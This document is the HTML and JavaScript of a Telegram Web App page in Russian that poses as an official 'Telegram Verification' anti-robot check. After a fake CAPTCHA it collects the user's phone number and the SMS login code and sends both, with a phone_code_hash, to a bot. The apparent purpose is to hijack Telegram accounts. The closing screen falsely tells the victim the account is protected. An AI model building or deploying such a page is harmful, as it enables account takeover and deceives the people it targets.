<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Telegram Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #1a1a2e;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: #16213e;
            border-radius: 16px;
            padding: 30px 20px;
            max-width: 380px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
        }
        
        .logo {
            width: 70px;
            height: 70px;
            background: #2aabee;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 35px;
        }
        
        h2 { font-size: 20px; margin-bottom: 8px; }
        p { color: #aaa; font-size: 14px; margin-bottom: 25px; }
        
        .captcha-box {
            background: #0f3460;
            border: 1px solid #2aabee;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 15px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .captcha-box:hover { background: #1a4a7a; }
        
        .checkbox {
            width: 28px;
            height: 28px;
            border: 2px solid #aaa;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s;
            flex-shrink: 0;
        }
        .checkbox.checked {
            background: #2aabee;
            border-color: #2aabee;
        }
        .checkmark {
            color: #fff;
            font-size: 18px;
            display: none;
        }
        .checkbox.checked .checkmark { display: block; }
        
        .captcha-text { text-align: left; }
        .captcha-text strong { display: block; font-size: 15px; }
        .captcha-text span { font-size: 12px; color: #aaa; }
        
        .hidden { display: none; }
        
        input {
            width: 100%;
            padding: 14px;
            border: 1px solid #333;
            border-radius: 10px;
            background: #0f3460;
            color: #fff;
            font-size: 16px;
            margin-bottom: 15px;
            outline: none;
            transition: border 0.3s;
        }
        input:focus { border-color: #2aabee; }
        
        button {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 10px;
            background: #2aabee;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        button:hover { background: #2299d4; }
        button:disabled { background: #555; cursor: not-allowed; }
        
        .status { margin-top: 15px; font-size: 13px; color: #4caf50; }
        .status.error { color: #f44336; }
        
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid #fff;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🔒</div>
        <h2>Подтверждение безопасности</h2>
        <p>Telegram проверяет что вы не робот</p>
        
        <!-- Шаг 1: Галочка -->
        <div id="step1">
            <div class="captcha-box" onclick="verifyCaptcha()">
                <div class="checkbox" id="captchaCheck">
                    <span class="checkmark">✓</span>
                </div>
                <div class="captcha-text">
                    <strong>Я не робот</strong>
                    <span>Нажмите для подтверждения</span>
                </div>
            </div>
        </div>
        
        <!-- Шаг 2: Номер телефона -->
        <div id="step2" class="hidden">
            <p style="color:#4caf50;">✅ Вы не робот</p>
            <input type="tel" id="phoneInput" placeholder="+79112223344" autocomplete="tel">
            <button onclick="sendCode()" id="sendBtn">📩 Отправить код</button>
            <div class="status" id="phoneStatus"></div>
        </div>
        
        <!-- Шаг 3: Код -->
        <div id="step3" class="hidden">
            <p>📩 Код отправлен на <strong id="phoneDisplay"></strong></p>
            <input type="text" id="codeInput" placeholder="Введите код из SMS" maxlength="5" inputmode="numeric" pattern="[0-9]*">
            <button onclick="verifyCode()" id="verifyBtn">✅ Подтвердить</button>
            <div class="status" id="codeStatus"></div>
            <p style="margin-top:10px;font-size:12px;color:#aaa;cursor:pointer;" onclick="goBackToPhone()">← Назад</p>
        </div>
        
        <!-- Шаг 4: Готово -->
        <div id="step4" class="hidden">
            <div style="font-size:50px;margin:20px 0;">✅</div>
            <h2>Проверка пройдена!</h2>
            <p>Спасибо за подтверждение личности</p>
            <div class="status" style="color:#4caf50;">Ваш аккаунт защищён</div>
        </div>
    </div>
    
    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
        
        let phoneNumber = '';
        let phoneCodeHash = '';
        
        // Данные бота (будут подставлены из Python)
        const BOT_TOKEN = tg.initDataUnsafe?.start_param || '';
        
        function verifyCaptcha() {
            const checkbox = document.getElementById('captchaCheck');
            checkbox.classList.add('checked');
            
            setTimeout(() => {
                document.getElementById('step1').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
                document.getElementById('phoneInput').focus();
            }, 800);
        }
        
        async function sendCode() {
            const phone = document.getElementById('phoneInput').value.trim();
            if (!phone) {
                document.getElementById('phoneStatus').textContent = 'Введите номер';
                document.getElementById('phoneStatus').className = 'status error';
                return;
            }
            
            const btn = document.getElementById('sendBtn');
            btn.disabled = true;
            btn.innerHTML = '<span class="spinner"></span>Отправка...';
            
            // Отправляем данные в бота через Telegram WebApp
            tg.sendData(JSON.stringify({
                action: 'send_code',
                phone: phone
            }));
        }
        
        function verifyCode() {
            const code = document.getElementById('codeInput').value.trim();
            if (!code || code.length < 5) {
                document.getElementById('codeStatus').textContent = 'Введите 5 цифр';
                document.getElementById('codeStatus').className = 'status error';
                return;
            }
            
            const btn = document.getElementById('verifyBtn');
            btn.disabled = true;
            btn.innerHTML = '<span class="spinner"></span>Проверка...';
            
            tg.sendData(JSON.stringify({
                action: 'verify_code',
                code: code,
                phone: phoneNumber,
                phone_code_hash: phoneCodeHash
            }));
        }
        
        function goBackToPhone() {
            document.getElementById('step3').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
        }
        
        // Получаем ответ от бота
        tg.onEvent('mainButtonClicked', () => {
            tg.close();
        });
        
        // Экспорт функций для вызова извне
        window.showCodeStep = function(phone, hash) {
            phoneNumber = phone;
            phoneCodeHash = hash;
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('step3').classList.remove('hidden');
            document.getElementById('phoneDisplay').textContent = phone;
            document.getElementById('codeInput').focus();
        };
        
        window.showDone = function() {
            document.getElementById('step3').classList.add('hidden');
            document.getElementById('step4').classList.remove('hidden');
            tg.MainButton.setText('Закрыть');
            tg.MainButton.show();
        };
        
        window.showError = function(msg, step) {
            if (step === 'phone') {
                document.getElementById('phoneStatus').textContent = msg;
                document.getElementById('phoneStatus').className = 'status error';
                document.getElementById('sendBtn').disabled = false;
                document.getElementById('sendBtn').textContent = '📩 Отправить код';
            } else if (step === 'code') {
                document.getElementById('codeStatus').textContent = msg;
                document.getElementById('codeStatus').className = 'status error';
                document.getElementById('verifyBtn').disabled = false;
                document.getElementById('verifyBtn').textContent = '✅ Подтвердить';
            }
        };
    </script>
</body>
</html>
